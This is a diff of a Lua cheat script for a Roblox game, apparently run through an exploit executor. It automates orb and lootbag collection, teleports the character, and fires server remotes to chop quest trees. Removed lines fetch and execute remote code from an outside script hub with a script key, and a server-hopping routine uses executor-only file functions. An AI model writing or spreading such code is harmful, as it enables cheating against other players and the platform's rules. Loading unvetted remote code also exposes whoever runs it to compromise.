@@ -1,8 +1,370 @@
-local function ZapHibScript()
-script_key="amuxkfDBfyvxleWxMyzyPqskazjCnXon";
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+local Player = game.Players.LocalPlayer
+local TreeNames = {"Oak", "Birch", "Elm", "Fantasy", "Evergreen", "Willow"}
+local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES") and Player.PlayerGui._MACHINES.NPCQuests.Frame.ItemsFrame:GetChildren()
+local TargetTrees = {}
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+local humanoidRootPart = Player.Character and Player.Character:WaitForChild("HumanoidRootPart")
+local checking = false
+
+local enterTeleport
+local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+function OrbCollect()
+    while true do 
+        local Orbs = workspace:FindFirstChild("__THINGS")
+        if Orbs then
+            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
+                local ohTable1 = { tonumber(orb.Name) }
+                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
+                orb:Destroy()
+            end 
+        end
+        task.wait()
+    end
 end
-spawn(ZapHibScript)
+
+
+function LootbagCollect()
+    while true do 
+        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
+        if Lootbags then
+            for _, bag in ipairs(Lootbags:GetChildren()) do
+                local ohTable1 = { tostring(bag) }
+                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
+                bag:Destroy()
+            end 
+        end
+        task.wait()
+    end
+end
+
+spawn(OrbCollect)
+spawn(LootbagCollect)
+
+if workspace:FindFirstChild("__THINGS") then
+    local instances = workspace.__THINGS:FindFirstChild("Instances")
+    if instances then
+        local woodcutting = instances:FindFirstChild("Woodcutting")
+        if woodcutting then
+            local teleports = woodcutting:FindFirstChild("Teleports")
+            if teleports then
+                enterTeleport = teleports:FindFirstChild("Enter")
+            end
+        end
+    end
+end
+
+
+if enterTeleport and humanoidRootPart then
+    repeat
+        local args = { "Nebula Forest" }
+        game:GetService("ReplicatedStorage").Network.Teleports_RequestTeleport:InvokeServer(unpack(args))
+        wait(10)
+    until (humanoidRootPart.Position - enterTeleport.Position).Magnitude <= 200
+
+    humanoidRootPart.CFrame = enterTeleport.CFrame
+else
+    warn("Could not locate enterTeleport or humanoidRootPart")
+end
+
+
+local function CheckLoop()
+    while true do
+        wait(0.01)
+        checking = true
+        wait(120)
+    end
+end
+spawn(CheckLoop)
+
+local function LeaveArea()
+    while true do
+        wait(0.01)
+        if checking == true then
+            if workspace:FindFirstChild("__THINGS") then
+                local instances = workspace.__THINGS:FindFirstChild("Instances")
+                if instances then
+                    local woodcutting = instances:FindFirstChild("Woodcutting")
+                    if woodcutting then
+                        local teleports = woodcutting:FindFirstChild("Teleports")
+                        if teleports then
+                            local leaveTeleport = teleports:FindFirstChild("Leave")
+                            if leaveTeleport and humanoidRootPart then
+                                if (humanoidRootPart.Position - leaveTeleport.Position).Magnitude <= 1000 then
+                                    humanoidRootPart.CFrame = CFrame.new(leaveTeleport.Position)
+                                end
+                                
+                                wait(5)
+                                
+                                local enterTeleport = teleports:FindFirstChild("Enter")
+                                if enterTeleport then
+                                    if (humanoidRootPart.Position - enterTeleport.Position).Magnitude <= 20 then
+                                        humanoidRootPart.CFrame = CFrame.new(enterTeleport.Position)
+                                    end
+                                end
+                                
+                                wait(10)
+
+                                local npcQuests = Player.PlayerGui:FindFirstChild("_MACHINES") 
+                                    and Player.PlayerGui._MACHINES:FindFirstChild("NPCQuests")
+                                
+                                local targetPosition = Vector3.new(6425.730, 463.9, -22290)
+
+                                repeat
+                                    wait(0.01)
+                                    if humanoidRootPart then
+                                        if (humanoidRootPart.Position - targetPosition).Magnitude <= 800 then
+                                            local randomOffset = Vector3.new(
+                                                math.random(-2, 2),
+                                                0,
+                                                math.random(-2, 2)
+                                            )
+                                            humanoidRootPart.CFrame = CFrame.new(targetPosition + randomOffset)
+                                            wait(0.1)
+                                            humanoidRootPart.CFrame = CFrame.new(targetPosition + randomOffset)
+                                        end
+                                    end
+                                    wait(1)
+                                until npcQuests and npcQuests.Enabled
+                                
+                                checking = false
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        wait(20)
+    end
+end
+
+spawn(LeaveArea)
+
+local Oak, Birch, Elm, Evergreen, Fantasy, Willow = false, false, false, false, false, false
+
+local function TreeTracker()
+    while true do
+        wait(0.01)
+        Oak, Birch, Elm, Evergreen, Fantasy, Willow = false, false, false, false, false, false
+
+        if itemsFrame then
+            for _, child in ipairs(itemsFrame) do
+                if child.Name == "Quest1" or child.Name == "Quest2" or child.Name == "Quest3" then
+                    local descText = child.Desc.Text
+                    local current, total = descText:match("(%d+)/(%d+)")
+                    current, total = tonumber(current), tonumber(total)
+
+                    local titleText = child.Title.Text
+                    for _, tree in ipairs(TreeNames) do
+                        if titleText:find(tree) then
+                            if current >= total then
+                                if tree == "Oak" then Oak = false
+                                elseif tree == "Birch" then Birch = false
+                                elseif tree == "Elm" then Elm = false
+                                elseif tree == "Evergreen" then Evergreen = false
+                                elseif tree == "Fantasy" then Fantasy = false
+                                elseif tree == "Willow" then Willow = false end
+                            else
+                                if tree == "Oak" then Oak = true
+                                elseif tree == "Birch" then Birch = true
+                                elseif tree == "Elm" then Elm = true
+                                elseif tree == "Evergreen" then Evergreen = true
+                                elseif tree == "Fantasy" then Fantasy = true
+                                elseif tree == "Willow" then Willow = true end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        wait(1)
+    end
+end
+
+spawn(TreeTracker)
+
+local found = false
+
+
+local function TreesFunction()
+    while true do
+        wait(0.00000001)
+        if checking == false then
+            found = false
+
+            if workspace:FindFirstChild("__THINGS") then
+                local instanceContainer = workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER")
+                if instanceContainer and instanceContainer:FindFirstChild("Active") then
+                    local woodcutting = instanceContainer.Active:FindFirstChild("Woodcutting")
+                    if woodcutting and woodcutting:FindFirstChild("Important") then
+                        local treesContainer = woodcutting.Important:FindFirstChild("Trees")
+                        
+                        for _, model in ipairs(treesContainer:GetChildren()) do
+                            if model:IsA("Model") then
+                                local TargetBrickColor = model:FindFirstChild("Leaves1").BrickColor
+                                
+                                if (Oak == true and TargetBrickColor == BrickColor.new("Tr. Flu. Yellow"))
+                                or (Birch == true and TargetBrickColor == BrickColor.new("Black"))
+                                or (Elm == true and TargetBrickColor == BrickColor.new("Sea Green"))
+                                or (Evergreen == true and TargetBrickColor == BrickColor.new("Camo"))
+                                or (Fantasy == true and TargetBrickColor == BrickColor.new("Dark indigo"))
+                                or (Willow == true and TargetBrickColor == BrickColor.new("Deep orange")) then
+                                    found = true
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                    local AttributeValue = model.Trunk:GetAttribute("UID")
+                                    if AttributeValue then
+                                        local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                        ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            
+            
+            wait()
+        end
+    end
+end
+
+spawn(TreesFunction)
+
+
+local function TreeBackUp()
+    while true do
+        wait(0.00000001)
+        if checking == false then
+            if found == false then
+                if workspace:FindFirstChild("__THINGS") then
+                    local instanceContainer = workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER")
+                    if instanceContainer and instanceContainer:FindFirstChild("Active") then
+                        local woodcutting = instanceContainer.Active:FindFirstChild("Woodcutting")
+                        if woodcutting and woodcutting:FindFirstChild("Important") then
+                            local treesContainer = woodcutting.Important:FindFirstChild("Trees")
+                            local closestTree
+                            local closestDistance = math.huge
+                            local playerPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+                            local TreeTargetFound = false
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Tr. Flu. Yellow") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Black") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Sea Green") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Camo") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Dark indigo") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                            for _, model in ipairs(treesContainer:GetChildren()) do
+                                if model:IsA("Model") and model:FindFirstChild("Trunk") then
+                                    if model:FindFirstChild("Leaves1").BrickColor == BrickColor.new("Deep orange") then
+                                        if TreeTargetFound ~= true then
+                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = model.Trunk.CFrame
+                                            local AttributeValue = model.Trunk:GetAttribute("UID")
+                                            if AttributeValue then
+                                                local args = { "Woodcutting", "ChopTree", AttributeValue }
+                                                ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
+                                            end
+                                            TreeTargetFound = true
+                                        end
+                                        break
+                                    end
+                                end
+                            end
+
+                        end
+                    end
+                end
+            end
+        end
+        wait()
+    end
+end
+
+spawn(TreeBackUp)
+
+
 
 
 
@@ -39,124 +401,10 @@ local function Menu()
 end
 spawn(Menu)
 
-local function LeaveArea() 
-    while true do
-        wait(180)
-        if workspace:FindFirstChild("__THINGS") then
-            local instances = workspace.__THINGS:FindFirstChild("Instances")
-            if instances then
-                local woodcutting = instances:FindFirstChild("Woodcutting")
-                if woodcutting then
-                    local teleports = woodcutting:FindFirstChild("Teleports")
-                    if teleports then
-                        local leaveTeleport = teleports:FindFirstChild("Leave")
-                        if leaveTeleport and humanoidRootPart then
-                            if (humanoidRootPart.Position - leaveTeleport.Position).Magnitude <= 500 then
-                                humanoidRootPart.CFrame = CFrame.new(leaveTeleport.Position)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-end
-spawn(LeaveArea)
 
 
-local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES") and Player.PlayerGui._MACHINES.NPCQuests.Frame.ItemsFrame:GetChildren()
-local TargetTrees = {}
 
-wait(5)
-local treeColors = {
-    Oak = BrickColor.new("Tr. Flu. Yellow"),
-    Birch = BrickColor.new("Black"),
-    Elm = BrickColor.new("Sea Green"),
-    Evergreen = BrickColor.new("Camo"),
-    Fantasy = BrickColor.new("Dark indigo"),
-    Willow = BrickColor.new("Deep orange")
-}
 
-local function TreeTracker()
-    while true do
-        TargetTrees = {}
-        if itemsFrame then
-            for _, child in ipairs(itemsFrame) do
-                if child.Name == "Quest1" or child.Name == "Quest2" or child.Name == "Quest3" then
-                    local descText = child.Desc.Text
-                    local current, total = descText:match("(%d+)/(%d+)")
-                    current, total = tonumber(current), tonumber(total)
-
-                    if current >= total then
-                        print("Quest " .. string.sub(child.Name, -1) .. " is completed")
-                    else
-                        local titleText = child.Title.Text
-                        for _, tree in ipairs(TreeNames) do
-                            if titleText:find(tree) then
-                                if not table.find(TargetTrees, tree) then
-                                    table.insert(TargetTrees, tree)
-                                    print(child.Name .. " | (" .. tree .. " in the quest) is not finished, only " .. current .. " has been cut out of " .. total)
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        wait()
-    end
-end
-spawn(TreeTracker)
-
-local function DeleteTrees()
-    local playerName = game.Players.LocalPlayer.Name
-    
-    while true do
-        if workspace:FindFirstChild("__THINGS") then
-            local instanceContainer = workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER")
-            if instanceContainer and instanceContainer:FindFirstChild("Active") then
-                local woodcutting = instanceContainer.Active:FindFirstChild("Woodcutting")
-                if woodcutting and woodcutting:FindFirstChild("Important") then
-                    local treesContainer = woodcutting.Important:FindFirstChild("Trees")
-                    if treesContainer then
-                        local trees = treesContainer:GetChildren()
-                        local treeCount = 0
-
-                        for _, model in pairs(trees) do
-                            if model:IsA("Model") then
-                                local leaves = model:FindFirstChild("Leaves1")
-                                if leaves then
-                                    local keepTree = false
-                                    
-                                    for _, targetTree in ipairs(TargetTrees) do
-                                        if leaves.BrickColor == treeColors[targetTree] then
-                                            keepTree = true
-                                            break
-                                        end
-                                    end
-
-                                    if playerName == "svipbatch1" then
-                                        if keepTree then
-                                            treeCount = treeCount + 1
-                                            if treeCount > 20 then
-                                                model:Destroy()
-                                            end
-                                        else
-                                            model:Destroy()
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        wait(2)
-    end
-end
-
-spawn(DeleteTrees)
 
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -226,84 +474,3 @@ end
 spawn(WebsiteDataUpdate)
 
 
-wait(180)
-local PlaceID = game.PlaceId
-local AllIDs = {}
-local foundAnything = ""
-local actualHour = os.date("!*t").hour
-local Deleted = false
-
-local last
-
-local File = pcall(function()
-   AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
-end)
-if not File then
-   table.insert(AllIDs, actualHour)
-   writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
-end
-function TPReturner()
-   local Site;
-   if foundAnything == "" then
-       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
-   else
-       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
-   end
-   local ID = ""
-   if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
-       foundAnything = Site.nextPageCursor
-   end
-   local num = 0;
-   local extranum = 0
-   for i,v in pairs(Site.data) do
-       extranum += 1
-       local Possible = true
-       ID = tostring(v.id)
-       if tonumber(v.maxPlayers) > tonumber(v.playing) then
-           if extranum ~= 1 and tonumber(v.playing) < last or extranum == 1 then
-               last = tonumber(v.playing)
-           elseif extranum ~= 1 then
-               continue
-           end
-           for _,Existing in pairs(AllIDs) do
-               if num ~= 0 then
-                   if ID == tostring(Existing) then
-                       Possible = false
-                   end
-               else
-                   if tonumber(actualHour) ~= tonumber(Existing) then
-                       local delFile = pcall(function()
-                           delfile("NotSameServers.json")
-                           AllIDs = {}
-                           table.insert(AllIDs, actualHour)
-                       end)
-                   end
-               end
-               num = num + 1
-           end
-           if Possible == true then
-               table.insert(AllIDs, ID)
-               wait()
-               pcall(function()
-                   writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
-                   wait()
-                   game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
-               end)
-               wait(4)
-           end
-       end
-   end
-end
-
-function Teleport()
-   while wait() do
-       pcall(function()
-           TPReturner()
-           if foundAnything ~= "" then
-               TPReturner()
-           end
-       end)
-   end
-end
-
-Teleport()
